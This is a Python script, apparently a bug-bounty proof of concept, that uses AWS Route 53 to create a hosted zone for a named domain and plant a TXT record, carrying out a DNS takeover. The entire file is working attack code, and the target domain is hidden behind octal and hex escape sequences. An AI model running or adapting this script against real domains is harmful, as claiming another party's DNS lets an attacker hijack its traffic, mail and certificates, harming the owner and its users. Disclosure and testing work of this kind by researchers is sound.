import boto3
import random
import string

# =============================================================================
# CONFIGURATION
# =============================================================================

AWS_ACCESS_KEY = ""
AWS_SECRET_KEY = ""
REGION = "us-east-1"

# The target domain for the takeover
TARGET_DOMAIN = "\145\157\x70\x73\056\x6E\154"

# The content of your proof-of-concept record
POC_TXT_VALUE = "Bugbounty - DNS takeover POC by Rizin"
POC_TXT_TTL = 60

# =============================================================================

client = boto3.client(
    'route53',
    aws_access_key_id=AWS_ACCESS_KEY,
    aws_secret_access_key=AWS_SECRET_KEY,
    region_name=REGION
)


def get_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def create_and_sign():
    caller_ref = f"poc-{get_random_string()}"

    try:
        # 1. Create the Hosted Zone
        print(f"[*] Creating Hosted Zone for: {TARGET_DOMAIN}")
        response = client.create_hosted_zone(
            Name=TARGET_DOMAIN,
            CallerReference=caller_ref
        )

        zone_id = response['HostedZone']['Id']
        assigned_ns = response['DelegationSet']['NameServers']

        print(f"[+] Zone Created! ID: {zone_id}")
        print(f"[+] Assigned AWS Name Servers: {assigned_ns}")

        # 2. Add the TXT Record (The "File" in DNS terms)
        print(f"[*] Adding TXT record to {zone_id}...")
        client.change_resource_record_sets(
            HostedZoneId=zone_id,
            ChangeBatch={
                "Comment": "DNS Takeover Proof",
                "Changes": [
                    {
                        "Action": "CREATE",
                        "ResourceRecordSet": {
                            "Name": TARGET_DOMAIN,
                            "Type": "TXT",
                            "TTL": POC_TXT_TTL,
                            "ResourceRecords": [{"Value": f'"{POC_TXT_VALUE}"'}],
                        },
                    }
                ],
            },
        )
        print(f"[+] Success: TXT record '{POC_TXT_VALUE}' has been added.")
        print(f"\n[!] Note: This only works if the parent domain's NS records match the assigned servers above.")

    except client.exceptions.HostedZoneAlreadyExists:
        print(f"[!] Error: The zone {TARGET_DOMAIN} already exists in your account.")
    except Exception as e:
        print(f"[!] Error: {str(e)}")


if __name__ == "__main__":
    create_and_sign()